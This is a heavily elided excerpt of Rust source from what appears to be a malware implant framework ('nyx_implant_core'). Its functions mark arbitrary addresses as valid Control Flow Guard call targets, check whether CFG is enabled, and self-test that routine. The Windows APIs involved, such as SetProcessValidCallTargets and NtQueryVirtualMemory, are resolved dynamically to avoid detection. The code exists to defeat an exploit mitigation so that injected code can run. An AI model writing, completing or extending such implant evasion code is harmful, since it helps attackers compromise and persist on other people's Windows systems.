...
pub unsafe fn mark_addr_cfg_valid(addr: usize) -> bool {
    ...
    let spvct =
        nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"SetProcessValidCallTargets");
    if let Some(a) = spvct {
        if mark_std(addr, a) {
            return true;
        }
...
pub unsafe fn mark_addrs_cfg_valid(addrs: &[usize]) -> usize {
    ...
    // Resolve APIs once.
    let nt_query_vm =
        match nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory") {
            Some(a) => a,
            None => return 0,
        };
    let nt_set_vm = match nyx_implant_core::resolve::export_addr(
        b"ntdll.dll",
...
pub fn cfg_enabled() -> bool {
    ...
    let gpm = unsafe {
        nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"GetProcessMitigationPolicy")
            .or_else(|| {
                nyx_implant_core::resolve::export_addr(
                    b"kernel32.dll",
                    b"GetProcessMitigationPolicy",
                )
            })
    };
    if let Some(a) = gpm {
...
pub fn selftest_cfg() -> u8 {
    ...
    let va = match unsafe {
        nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
    ...
    // Free the test page.
    let vf = match unsafe {
        nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"VirtualFree")
